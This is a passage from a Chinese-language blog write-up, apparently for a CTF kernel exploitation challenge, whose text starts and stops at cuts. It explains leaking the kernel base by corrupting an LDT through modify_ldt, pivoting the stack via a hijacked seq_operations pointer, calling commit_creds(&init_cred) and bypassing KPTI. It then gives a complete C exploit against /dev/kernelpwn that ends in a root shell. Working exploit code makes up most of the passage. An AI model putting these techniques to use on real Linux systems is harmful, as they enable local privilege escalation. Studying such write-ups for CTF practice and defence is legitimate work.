<code>vmalloc_base</code>，这一块区域到物理地址间的映射是<strong>不连续的</strong></p></blockquote><p>这一块区域的起始地址称之为 <code>page_offset_base</code>，其地址为 <code>0xffff888000000000</code>，我们从这个地址开始搜索即可</p><p>因为在read_ldt函数中如果copy_to_user出现问题就会返回负数，所以我们可以利用这种方式来进行爆破。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x8</span>, buf);</span><br><span class="line">    <span class="keyword">int</span> ret = syscall(SYS_modify_ldt, <span class="number">0</span>, tmp, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        addr += <span class="number">0x40000000</span>;</span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)buf = addr;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base: %p\n&quot;</span>, addr);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在那道page_offset_base之后我们可以尝试泄露dir的值，在距离page_offset_base不远处会出现一个指向<code>kernel_base+0x40</code>的指针，所以可以泄漏出内核的基地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    create(<span class="number">0x50</span>, buf);</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x8</span>, buf);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">0</span>, info, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x040</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            kernel_base = info[i] - <span class="number">0x40</span>;</span><br><span class="line">            kernel_offset = kernel_base - vmlinux_base;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%p\n&quot;</span>, kernel_base);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%p\n&quot;</span>, kernel_offset);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (kernel_base)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    search_addr += <span class="number">0x1000</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>泄露完地址之后，就是想办法提升权限了。可以看出来这里并不存在任意地址写，所以思路还是栈迁移随后ROP，这里就需要利用到另一个结构体了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个结构体的大小位0x20也满足题目所给的范围，当我们复写了start指针之后调用read就会call start指针控制rip并且此时的rax等于我们的，所以我们可以使用下面这个gadget来劫持rsp。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xchg eax,esp</span><br></pre></td></tr></table></figure><p>这里没有办法将prepare_kernel_cred的返回值给到rdi，所以这里使用的是另一种方式，在内核当中有一个特殊的 cred —— <code>init_cred</code>，这是 init 进程的 cred，因此<strong>其权限为 root</strong>，且该 cred 并非是动态分配的，因此当我们泄露出内核基址之后我们也便能够获得 init_cred 的地址，那么我们就只需要执行一次 <code>commit_creds(&amp;init_cred)</code> 便能完成提权</p><h4 id="bypass-kpti"><a href="#bypass-kpti" class="headerlink" title="bypass kpti"></a><strong>bypass kpti</strong></h4><p>我对于kpti的认知就是，cr3存在相应的页表，如果，在从内核态回到用户态时没修改cr3，那么在用户态就会因为找不到对应的东西出现段错误。</p><p>所以此时就有第一个bypass的思路，因为出现段错误肯定是有某个handle函数来处理，所以我们可以使用signal来修改信号的handle函数。</p><p>第二种就是正常进行rop，但是中间修改一下cr3的值</p><p>一般来说修改cr3需要的gadget是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rdi,cr3</span><br><span class="line">or  rdi,1000h</span><br><span class="line">mov cr3,rdi</span><br></pre></td></tr></table></figure><h4 id="综上，得出exp"><a href="#综上，得出exp" class="headerlink" title="综上，得出exp"></a><strong>综上，得出exp</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">create_chunk_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> buf;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">edit_chunk_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> buf;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">delete_chunk_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> idx;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> entry_number;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> base_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> limit;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> seg_32bit : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> contents : <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> read_exec_only : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> limit_in_pages : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> seg_not_present : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> useable : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> lm : <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs\n&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss\n&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp\n&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf\n&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">long</span> size, <span class="keyword">unsigned</span> <span class="keyword">long</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">create_chunk_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.size = size;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x20</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span> <span class="params">(<span class="keyword">long</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">delete_chunk_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    ioctl(fd, <span class="number">0x30</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">long</span> <span class="keyword">int</span> idx, <span class="keyword">long</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">long</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">edit_chunk_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    arg.size = size;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x50</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">char</span> *buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">char</span> *tmp[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *info = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="built_in">memset</span>(info, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&quot;\0&quot;</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x20</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kernelpwn&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    create(<span class="number">0x10</span>, buf);</span><br><span class="line">    create(<span class="number">0x20</span>, buf);</span><br><span class="line">    <span class="keyword">delete</span> (<span class="number">0</span>);</span><br><span class="line">    desc.base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> addr = <span class="number">0xffff888000000000</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        edit(<span class="number">0</span>, <span class="number">0x8</span>, buf);</span><br><span class="line">        <span class="keyword">int</span> ret = syscall(SYS_modify_ldt, <span class="number">0</span>, tmp, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            addr += <span class="number">0x40000000</span>;</span><br><span class="line">            *(<span class="keyword">uint64_t</span> *)buf = addr;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base: %p\n&quot;</span>, addr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> search_addr = addr;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        edit(<span class="number">0</span>, <span class="number">0x8</span>, buf);</span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">0</span>, info, <span class="number">0x1000</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span> / <span class="number">8</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x040</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                kernel_base = info[i] - <span class="number">0x40</span>;</span><br><span class="line">                kernel_offset = kernel_base - vmlinux_base;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%p\n&quot;</span>, kernel_base);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%p\n&quot;</span>, kernel_offset);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (kernel_base)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        search_addr += <span class="number">0x1000</span>;</span><br><span class="line">        *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> xchg_eax_esp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> iretq;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs;</span><br><span class="line"></span><br><span class="line">    swapgs = <span class="number">0xbc889f</span> + kernel_base;</span><br><span class="line">    iretq = <span class="number">0x2df</span> + kernel_base;</span><br><span class="line">    xchg_eax_esp = <span class="number">0xffffffff810e5bb9</span> + kernel_offset;</span><br><span class="line">    pop_rdi = <span class="number">0xffffffff8108c420</span> + kernel_offset;</span><br><span class="line">    commit_creds = <span class="number">0xc9540</span> + kernel_base;</span><br><span class="line">    prepare_kernel_cred = <span class="number">0xc99d0</span> + kernel_base;</span><br><span class="line">    init_cred = <span class="number">0x1a6b700</span> + kernel_base;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> (<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *fake_stack = mmap(xchg_eax_esp &amp; <span class="number">0xfffff000</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_stack: 0x%llx\n&quot;</span>, fake_stack);</span><br><span class="line">    fake_stack = xchg_eax_esp &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_stack: 0x%llx\n&quot;</span>, fake_stack);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = xchg_eax_esp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> fake_seq_struct[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fake_seq_struct[<span class="number">0</span>] = xchg_eax_esp;</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x8</span>, fake_seq_struct);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    fake_stack[i++] = pop_rdi;</span><br><span class="line">    fake_stack[i++] = init_cred;</span><br><span class="line">    fake_stack[i++] = commit_creds;</span><br><span class="line">    fake_stack[i++] = swapgs;</span><br><span class="line">    fake_stack[i++] = iretq;</span><br><span class="line">    fake_stack[i++] = (<span class="keyword">uint64_t</span>)get_shell;</span><br><span class="line">    fake_stack[i++] = user_cs;</span><br><span class="line">    fake_stack[i++] = user_rflags;</span><br><span class="line">    fake_stack[i++] = user_sp;</span><br><span class="line">    fake_stack[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    read(seq_fd, <span class="number">0x1234</span>, <span class="number">0x1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到我们使用的gadget只有32位，并且rax指向的还是这个gadget的地址，所以这里调用mmap的方式就按照exp中的即可</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220814114004277.png"                      alt="image-20220814114004277"                ></p><p>如果这里使用第二种绕过kpti的话可以payload换成</p><figure class="highlight 